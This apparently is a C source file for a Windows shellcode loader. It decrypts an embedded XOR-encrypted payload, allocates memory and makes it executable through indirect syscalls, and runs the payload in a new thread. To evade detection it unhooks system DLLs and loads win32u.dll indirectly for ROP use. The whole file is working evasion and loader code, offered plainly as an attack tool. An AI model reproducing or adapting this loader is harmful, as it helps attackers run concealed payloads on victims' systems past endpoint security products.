#include <Windows.h>
#include <shlobj.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

#pragma comment (lib, "shell32.lib")

unsigned char EncData[] = {
		0x07, 0xE9, 0x7E, 0x47, 0x0F, 0x4D, 0xC1, 0xA7, 0x03, 0xA9, 0x44, 0xFA, 0x46, 0xFD, 0x5B, 0xFE,
		0x5D, 0xF9, 0x3C, 0x61, 0x6A, 0xFD, 0x9A, 0xE5, 0x73, 0xF1, 0x9E, 0xE9, 0x0F, 0xF5, 0x92, 0xED,
		0x3B, 0x89, 0x96, 0xB1, 0x4F, 0x8D, 0x2E, 0x70, 0x69, 0x83, 0x68, 0xFA, 0xEE, 0x85, 0x18, 0x0F,
		0x87, 0xED, 0x4C, 0xAF, 0x2D, 0xF9, 0x11, 0x96, 0xF2, 0x10, 0x38, 0x9A, 0x36, 0x1C, 0xDB, 0x32,
		0x69, 0xA0, 0x6C, 0xAB, 0xB4, 0xB7, 0x61, 0x6C, 0x01, 0xD5, 0x0D, 0xEA, 0x97, 0x66, 0xC9, 0x67,
		0x4B, 0xF1, 0x4D, 0xBB, 0xCA, 0x35, 0x25, 0x90, 0x1B, 0xF8, 0x85, 0xAB, 0xDC, 0xB5, 0x41, 0xBB,
		0xD0, 0x41, 0x7D, 0x4A, 0x5E, 0xD5, 0x82, 0x51, 0x2B, 0xF6, 0xAC, 0x4A, 0xEC, 0x39, 0xE1, 0x47,
		0x6A, 0xC7, 0x20, 0x22, 0xA6, 0x5D, 0x40, 0xD7, 0xDF, 0x58, 0xB4, 0xD2, 0x7A, 0x5C, 0x78, 0xDE,
		0x43, 0xC1, 0x08, 0xD2, 0x33, 0x26, 0xCD, 0x03, 0x8B, 0x6C, 0xBC, 0xFA, 0xF2, 0xF5, 0xD1, 0x6B,
		0x00, 0x71, 0xA9, 0x7A, 0x8E, 0xE5, 0xF7, 0x76, 0x18, 0x35, 0xDD, 0x7F, 0x1C, 0x7D, 0x85, 0x76,
		0x9A, 0x91, 0xDC, 0xC8, 0x9B, 0xCD, 0xE9, 0x46, 0x73, 0x08, 0xFD, 0x0A, 0xFF, 0x13, 0xF0, 0x15,
		0xEA, 0x09, 0xEC, 0x0A, 0xEE, 0x0F, 0xF9, 0xD4, 0x5F, 0x79, 0xF4, 0x09, 0x48, 0xBD, 0xE1, 0x1E,
		0xE2, 0x3B, 0xF5, 0xE8, 0xAD, 0x8C, 0x96, 0x98, 0x3C, 0x96, 0x98, 0x23, 0x7D, 0x6C, 0xC9, 0x6F,
		0xCB, 0x71, 0xCD, 0x73, 0xCF, 0x3D, 0x5C, 0xFA, 0xD2, 0x78, 0xD5, 0x7B, 0x96, 0xC7, 0xE8, 0xF4,
		0xB4, 0x06, 0x22, 0x56, 0x64, 0x65, 0xFC, 0xAD, 0xE9, 0xC8, 0x5F, 0x2D, 0x72, 0x30, 0x74, 0x70,
		0x3E, 0xD9, 0x6E, 0x57, 0xC7, 0xA9, 0xF7, 0xEB, 0xF9, 0x19, 0x0E, 0x7B, 0x82, 0x98, 0x42, 0xD8,
		0xE8, 0xD3, 0x92, 0xC9, 0xFF, 0xFC, 0x40, 0x2E, 0xD9, 0x56, 0xD0, 0xC8, 0x66, 0xC1, 0x6A, 0xAF
};

// 'win32u.dll' contains the ROPs to jump to later 
HRESULT AddWin32uToIat() {

	// 'SHGetFolderPathW' is exported from 'shell32.dll', that will load 'win32u.dll' 
	// so, instead of loading 'win32u.dll' directly, we simply use one of shell32.dll's APIs
	// forcing 'win32u.dll' to be loaded without the need of calling 'LoadLibrary' or 'LdrLoadDll'
	// other dlls that will load 'win32u.dll', are 'ole32.dll' and 'comctl32.dll'

	WCHAR szPath[MAX_PATH] = { 0 };
	return SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}

// global variable
NTAPI_FUNC g_Nt = { 0 };

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
#endif


	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
#endif
	return TRUE;
}


int main() {

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	SIZE_T		sSize = sizeof(EncData);
	DWORD		dwOld = NULL;
	HANDLE		hProcess = (HANDLE)-1,	// local process
		hThread = NULL;

	AddWin32uToIat();

	if (!IniUnhookIndirectSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Unhooking Indirect-Syscalls\n");
#endif
		return -1;
	}

	if (!IniUnhookDirectCalls()) {
#ifdef DEBUG
		PRINTA("[!] InitializeDirectCalls Failed\n");
#endif // DEBUG
		return -1;
	}

	if (!InitializeNtSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
#endif
		return -1;
	}

	if (!RefreshAllDlls()) {
#ifdef DEBUG
		PRINTA("[!] RefreshAllDlls Failed\n");
#endif // DEBUG
		return -1;
	}

	// allocating memory
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	XOR(pAddress, EncData, sizeof(EncData));

	// changing memory protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// executing the payload
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// waiting for the payload
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	return 0;
}